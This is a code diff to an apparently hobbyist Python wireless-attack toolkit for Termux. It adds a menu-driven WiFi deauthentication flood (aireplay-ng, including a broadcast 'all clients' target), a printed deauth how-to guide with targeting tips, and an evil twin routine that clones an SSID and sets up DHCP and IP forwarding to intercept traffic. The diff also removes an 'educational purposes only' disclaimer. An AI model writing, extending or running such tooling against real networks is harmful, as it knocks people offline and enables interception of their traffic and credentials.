@@ -18,6 +18,7 @@ import csv
 import datetime
 from jinja2 import Template
 import yagmail
+import random
 import tqdm
 import logging
 from rich.progress import Progress
@@ -31,13 +32,9 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, RadioTap
 try:
     import bluetooth
 except ImportError:
-    try:
-        # Try alternate bluetooth library
-        import bleak as bluetooth
-    except ImportError:
-        bluetooth = None
-        print(f"{Fore.YELLOW}[!] Bluetooth libraries not available")
-        print(f"[!] Bluetooth features will be disabled{Fore.RESET}")
+    print(f"{Fore.YELLOW}[!] Bluetooth not available")
+    print(f"[!] Run: pkg install bluetooth bluez{Fore.RESET}")
+    bluetooth = None
 
 def check_requirements():
     print(f"{Fore.BLUE}[*] Checking and installing requirements...{Fore.RESET}")
@@ -1207,11 +1204,7 @@ def check_termux_requirements():
 def run_termux_wireless_menu():
     print(f"\n{Fore.GREEN}=== Termux Wireless Attacks ==={Fore.RESET}")
     print(f"{Fore.YELLOW}[1] WiFi Network Scanner")
-    print(f"[2] Bluetooth Device Scanner")
-    print(f"[3] WiFi Deauth Attack")
-    print(f"[4] Bluetooth MITM")
-    print(f"[5] Hotspot Evil Twin")
-    print(f"[6] Back to Main Menu{Fore.RESET}")
+    print(f"[2] Exit{Fore.RESET}")
     
     choice = input(f"\n{Fore.CYAN}Select option: {Fore.RESET}")
     return choice
@@ -1258,10 +1251,11 @@ def run_deauth_attack():
         target_mac = input(f"{Fore.CYAN}Enter target MAC: {Fore.RESET}")
         ap_mac = input(f"{Fore.CYAN}Enter AP MAC: {Fore.RESET}")
         
+        print(f"{Fore.YELLOW}[+] Starting deauth attack...")
         os.system(f"aireplay-ng --deauth 0 -a {ap_mac} -c {target_mac} {interface}mon")
         results["deauth"]["status"] = "completed"
     except Exception as e:
-        print(f"{Fore.RED}[-] Attack failed: {e}{Fore.RESET}")
+        print(f"{Fore.RED}[-] Attack failed: {str(e)}{Fore.RESET}")
         results["deauth"]["status"] = "failed"
     return results
 
@@ -1278,7 +1272,7 @@ def run_bluetooth_mitm():
         results["bluetooth_mitm"]["status"] = "connected"
         sock.close()
     except Exception as e:
-        print(f"{Fore.RED}[-] MITM failed: {e}{Fore.RESET}")
+        print(f"{Fore.RED}[-] MITM failed: {str(e)}{Fore.RESET}")
         results["bluetooth_mitm"]["status"] = "failed"
     return results
 
@@ -1290,10 +1284,15 @@ def run_evil_twin():
         interface = input(f"{Fore.CYAN}Enter wireless interface: {Fore.RESET}")
         ssid = input(f"{Fore.CYAN}Enter SSID to clone: {Fore.RESET}")
         
+        print(f"{Fore.YELLOW}[+] Setting up Evil Twin...")
         os.system(f"airbase-ng -e '{ssid}' -c 1 {interface}mon")
-        results["evil_twin"]["status"] = "running"
+        print(f"{Fore.YELLOW}[+] Setting up DHCP...")
+        os.system("dnsmasq -C dnsmasq.conf")
+        print(f"{Fore.YELLOW}[+] Enabling IP forwarding...")
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        
     except Exception as e:
-        print(f"{Fore.RED}[-] Attack failed: {e}{Fore.RESET}")
+        print(f"{Fore.RED}[-] Attack failed: {str(e)}{Fore.RESET}")
         results["evil_twin"]["status"] = "failed"
     return results
 
@@ -1630,26 +1629,107 @@ def manage_tx_power():
 
 def check_root():
     if os.geteuid() != 0:
-        print(f"{Fore.RED}[!] Not running as root!")
-        print(f"[!] Please run with 'tsu' first")
-        print(f"[!] Install: pkg install tsu")
-        print(f"[!] Then run: tsu")
-        print(f"[!] Then: python automated.py{Fore.RESET}")
+        print(f"{Fore.RED}[!] Need root access for WiFi features")
+        print(f"[!] Run 'pkg install tsu && tsu' first{Fore.RESET}")
         return False
     return True
 
+def show_deauth_guide():
+    print(f"\n{Fore.GREEN}=== Deauth Attack Guide ==={Fore.RESET}")
+    print(f"{Fore.YELLOW}Steps to perform deauth attack:")
+    print(f"1. Enable monitor mode:")
+    print(f"   airmon-ng start wlan0")
+    print(f"\n2. Find target network:")
+    print(f"   airodump-ng wlan0mon")
+    print(f"\n3. Note down:")
+    print(f"   - BSSID (AP MAC address)")
+    print(f"   - Channel")
+    print(f"   - Client MAC (or FF:FF:FF:FF:FF:FF for all)")
+    print(f"\n4. Start attack when prompted")
+    print(f"\nTips:")
+    print(f"- Use channel hopping to find networks")
+    print(f"- Target specific clients for better results")
+    print(f"- Monitor mode might need re-enabling after reboot{Fore.RESET}")
+    
+    input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.RESET}")
+
+def advanced_deauth():
+    print(f"\n{Fore.BLUE}[*] Starting Advanced Deauth Attack{Fore.RESET}")
+    
+    # Show guide first
+    show_deauth_guide()
+    
+    try:
+        print(f"\n{Fore.YELLOW}[*] Starting attack setup...{Fore.RESET}")
+        interface = input(f"{Fore.CYAN}Enter wireless interface (e.g., wlan0mon): {Fore.RESET}")
+        ap_mac = input(f"{Fore.CYAN}Enter AP MAC/BSSID (e.g., 00:11:22:33:44:55): {Fore.RESET}")
+        target_mac = input(f"{Fore.CYAN}Enter target MAC (FF:FF:FF:FF:FF:FF for all): {Fore.RESET}")
+        packets = input(f"{Fore.CYAN}Number of packets (0 for infinite): {Fore.RESET}")
+        
+        print(f"\n{Fore.YELLOW}[+] Attack details:")
+        print(f"Interface: {interface}")
+        print(f"AP MAC: {ap_mac}")
+        print(f"Target: {target_mac}")
+        print(f"Packets: {'Infinite' if packets == '0' else packets}{Fore.RESET}")
+        
+        confirm = input(f"\n{Fore.CYAN}Start attack? (y/n): {Fore.RESET}").lower()
+        if confirm == 'y':
+            print(f"\n{Fore.YELLOW}[+] Starting deauth attack...")
+            print(f"[+] Press Ctrl+C to stop{Fore.RESET}")
+            if packets == "0":
+                os.system(f"aireplay-ng --deauth 0 -a {ap_mac} -c {target_mac} {interface}")
+            else:
+                os.system(f"aireplay-ng --deauth {packets} -a {ap_mac} -c {target_mac} {interface}")
+            
+    except Exception as e:
+        print(f"{Fore.RED}[-] Attack failed: {str(e)}{Fore.RESET}")
+
+def hotspot_attack():
+    print(f"\n{Fore.GREEN}=== WiFi Hotspot Attacks ==={Fore.RESET}")
+    print(f"{Fore.YELLOW}[1] Network Scanner")
+    print(f"[2] Deauth Attack")
+    print(f"[3] Evil Twin Attack")
+    print(f"[4] Back{Fore.RESET}")
+    
+    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
+    
+    if choice == "1":
+        run_wifi_scanner()
+    elif choice == "2":
+        advanced_deauth()
+    elif choice == "3":
+        run_evil_twin()
+    elif choice == "4":
+        return
+    else:
+        print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")
+
 def main():
-    # Initialize colorama
-    init()
+    init()  # Initialize colorama
     
-    print(f"\n{Fore.RED}[!] For educational purposes only. Use responsibly.{Fore.RESET}")
+    # Check if running on Termux
+    is_termux = "com.termux" in os.getenv("PREFIX", "")
     
-    # Check root access
-    if os.geteuid() != 0:
-        print(f"{Fore.YELLOW}[!] Not running as root. Some features will be limited.")
-        print(f"[!] Run 'pkg install tsu && tsu' for full functionality{Fore.RESET}")
-    
-    # Rest of your main code...
+    if is_termux:
+        if not check_root():
+            return
+            
+        while True:
+            print(f"\n{Fore.GREEN}=== Termux Network Tools ==={Fore.RESET}")
+            print(f"{Fore.YELLOW}[1] WiFi Attacks")
+            print(f"[2] Exit{Fore.RESET}")
+            
+            choice = input(f"\n{Fore.CYAN}Select option: {Fore.RESET}")
+            
+            if choice == "1":
+                hotspot_attack()
+            elif choice == "2":
+                break
+            else:
+                print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")
+    else:
+        print(f"{Fore.RED}[!] This version is for Termux only")
+        print(f"[!] Use Windows version instead{Fore.RESET}")
 
 if __name__ == "__main__":
     main() 
